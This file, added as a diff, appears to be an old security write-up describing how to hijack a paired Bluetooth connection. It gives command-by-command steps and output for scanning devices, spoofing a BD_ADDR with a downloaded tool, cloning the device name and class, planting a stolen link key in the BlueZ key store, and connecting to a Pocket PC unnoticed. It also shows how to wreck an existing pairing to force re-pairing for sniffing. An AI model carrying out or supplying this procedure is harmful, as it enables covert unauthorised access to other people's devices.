@@ -1,0 +1,154 @@
+				Theft of Bluetooth Link Keys for Fun and Profit? 
+					kf[at]digitalmunition[dot]com
+				http://www.digitalmunition.com/TheftOfLinkKey.txt
+
+In essence two things are required to attack a bluetooth pair. The ability to spoof a BD_ADDR and possession of a 
+secret key also known as a Link Key. Some folks may argue that a third item is required, in the form of a Bluetooth 
+Protocol Analyzer, however several trivial ways to steal link keys exist. 
+
+In the Bluetooth Specification version 1.0A description of the Link Manager Protocol, section 3.2.1 states that
+"The authentication procedure is based on a challenge-response scheme... The verifier sends an LMP_au_rand PDU which 
+contains a random number (the challenge) to the claimant. The claimant calculates a response, which is a function of 
+the challenge, the claimant's BD_ADDR and a secret key. That response is sent back to the verifier, which checks if 
+the response was correct or not... A successful calculation of the authentication response requires that two devices 
+share a secret key." 
+
+With both a spoofed BD_ADDR and a Link Key in hand we can simply allow our device to handle the challenge response 
+with out any special code required. Once the authentication has passed we in theory should have untethered access to 
+the device we are attacking. 
+
+In this example scenario We have 3 devices involved: 'threat', 'gumstix', and 'pocket_pc'. We will be attacking the 
+pairing between 'pocket_pc' and 'threat' from 'gumstix'.
+
+Since 'threat' is currently paired with 'pocket_pc' it can connect to the Serial Port profile at will. This profile
+has been protected by the check box "Authentication (Passkey) required", so any non paired device that attempts to 
+connect will be prompted to pair or simply refused a connection.
+
+Here is the connection from 'threat' to 'pocket_pc'
+threat:~# rfcomm connect 2 00:04:3E:65:A1:C8 1
+Connected /dev/rfcomm2 to 00:04:3E:65:A1:C8 on channel 1
+Press CTRL-C for hangup
+
+And here is the connection from 'gumstix' to 'pocket_pc'
+#  rfcomm connect 2 00:04:3E:65:A1:C8 1
+Can't connect RFCOMM socket: Connection refused
+(we also got a pairing request from 'gumstix' on the 'pocket_pc' screen)
+
+As mentioned above theft of the actual Link Key is fairly trivial, so for the scope of this document assume that 
+either A) the pairing process was observed via Protocol Analyzer or B) Some sort of software bug was used to steal 
+the link key. 
+
+As an example we could have forced a pairing attempt between 'pocket_pc' and 'gumstix' for sniffing purposes by 
+causing the existing pair to become invalid. From there calculations against the link key can be done. 
+
+# cat > linkkeys
+00:04:3E:65:A1:C8 thisisgarbadeasdasdadasdadasdasds 2
+^C
+#   rfcomm connect 2 00:04:3E:65:A1:C8 1
+Can't connect RFCOMM socket: Connection refused
+
+At this point the pairing data stord on 'pocket_pc' has been ruined, and the devices will have to re-pair. 
+
+Another chance to steal the link key could arise with certain software bugs in a devices Bluetooth Stack, for example 
+http://cvs.sourceforge.net/viewcvs.py/bluez/utils/hcid/security.c?r1=1.34&r2=1.31 .
+
+Our goal in this attack is to allow 'gumstix' to connect to 'pocket_pc' without prompting for device pairing. 
+In this case since we already know that 'pocket_pc' and 'threat' are paired so we will make an attempt to spoof 
+requests from 'gumstix' by pretenting to be 'threat'. 
+
+>>From 'gumstix' first we must first obtain a few things, the device address, name and class of 'threat'. 
+
+# hcitool inquiry
+Inquiring ...
+        00:04:3E:65:A1:C8       clock offset: 0x0ee7    class: 0x120110
+        00:0A:3A:54:71:95       clock offset: 0x0010    class: 0x3e0100
+# hcitool scan
+Scanning ...
+        00:04:3E:65:A1:C8       Pocket_PC
+        00:0A:3A:54:71:95       threat
+
+Next will simply configure 'gumstix' to become a mirror image of 'threat' based on the above data. 
+
+The first step is to steal the BD_ADDR from 'threat'. 
+
+For this I personally have 2 options, one is my ROK 101 008 from Ericsson and option two is my ROK 104 001 from 
+Infineon. The only other option that I am aware of is the Infineon pba31307 however I have not tested this chip 
+myself. As a side note I am currently unaware of a method that allows a Cambridge silicon radio to specify a BD_ADDR. 
+
+Since the gumstix platform comes with an ROK 104 001 on board we will download an arm binary that lets us set 
+the BD_ADDR from http://www.digitalmunition.com/setbd-gumstix-bluez.tar.gz
+
+# /mnt/setbd-gumstix-bluez 00:0A:3A:54:71:95
+Using BD_ADDR from command line
+00:0A:3A:54:71:95
+< HCI Command: ogf 0x3f, ocf 0x0022, plen 255
+  95 71 54 3A 0A 00 00 00 10 C9 00 40 B0 FD FF BE 24 FC FF BE
+  98 3F 00 40 3C 2C 00 40 A4 FD FF BE A4 FD FF BE 00 00 00 00
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  03 00 00 00 34 80 00 00 04 00 00 00 20 00 00 00 05 00 00 00
+  06 00 00 00 06 00 00 00 00 10 00 00 07 00 00 00 00 00 00 40
+  08 00 00 00 00 00 00 00 09 00 00 00 A4 88 00 00 00 00 00 00
+  00 00 00 00 0B 00 00 00 00 00 00 00 0C 00 00 00 00 00 00 00
+  0D 00 00 00 00 00 00 00 0E 00 00 00 00 00 00 00 00 00 00 00
+  14 50 00 40 78 C8 00 40 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00 00 00 00 00 0F 53 8E 07 BC 85 00 00
+  FE 37 07 00 6C 99 03 40 7C 53 00 40 44 B6 07 40 6C 99 03 40
+  B0 FD FF BE 78 87 00 00 A4 FD FF BE 02 00 00 00 20 42 00 40
+  6C FE FF BE D8 88 00 00 A4 88 00 00 5C B1 07
+> HCI Event: 0x06 plen 149
+  71 54 3A 0A
+hci0:   Type: UART
+        BD Address: 00:0A:3A:54:71:95 ACL MTU: 672:8 SCO MTU: 64:0
+        UP RUNNING PSCAN ISCAN
+        RX bytes:4433 acl:96 sco:0 events:306 errors:0
+        TX bytes:3372 acl:98 sco:0 commands:94 errors:0
+
+Next we must take both the device name and device class from 'threat' 
+
+# hciconfig hci0 class 0x3e0100
+# hciconfig hci0 name threat
+
+I have found that some devices are very picky about the device class and name matching the original paired device 
+when a spoofed connection attempt is made. 
+
+When we are all finished hci0 should look like the following. 
+# hciconfig hci0 -a
+hci0:   Type: UART
+        BD Address: 00:0A:3A:54:71:95 ACL MTU: 672:8 SCO MTU: 64:0
+        UP RUNNING PSCAN ISCAN
+        RX bytes:6202 acl:136 sco:0 events:425 errors:0
+        TX bytes:4667 acl:138 sco:0 commands:124 errors:0
+        Features: 0xff 0xfb 0x01 0x00 0x00 0x00 0x00 0x00
+        Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3
+        Link policy: RSWITCH HOLD SNIFF PARK
+        Link mode: SLAVE ACCEPT
+        Name: 'threat'
+        Class: 0x3e0100
+        Service Classes: Networking, Rendering, Capturing
+        Device Class: Computer, Uncategorized
+        HCI Ver: 1.1 (0x1) HCI Rev: 0x8105 LMP Ver: 1.1 (0x1) LMP Subver: 0x8d40
+        Manufacturer: Ericsson Technology Licensing (0)
+
+The final step involves inserting our stolen link key into the Bluez key store. The keystore resides in 
+/var/lib/bluetooth/<bdaddr>/linkkeys where <bdaddr> is the device address of the machine running Bluez. 
+The linkkeys file format is <remoteaddr> <128 bit link key> <key type>. 
+
+# cd /var/lib/bluetooth/
+# mkdir 00:0A:3A:54:71:95
+# cd 00\:0A\:3A\:54\:71\:95/
+# cat > linkkeys
+00:04:3E:65:A1:C8 AA0F3125267C236E10B145F1DF5BA7D7 2
+^C
+At this point we should be all set to test out our stolen link key and spoofed address. 
+
+#  rfcomm connect 2 00:04:3E:65:A1:C8 1
+Connected /dev/rfcomm2 to 00:04:3E:65:A1:C8 on channel 1
+Press CTRL-C for hangup
+
+Success! 
+
+There is no indication of a connection on the ipaq unless you go to Incomming Connections in the Bluetooth Manager, 
+and at this point we have access to 'pocket_pc' as if we were 'threat'. 
+
+-KF
+
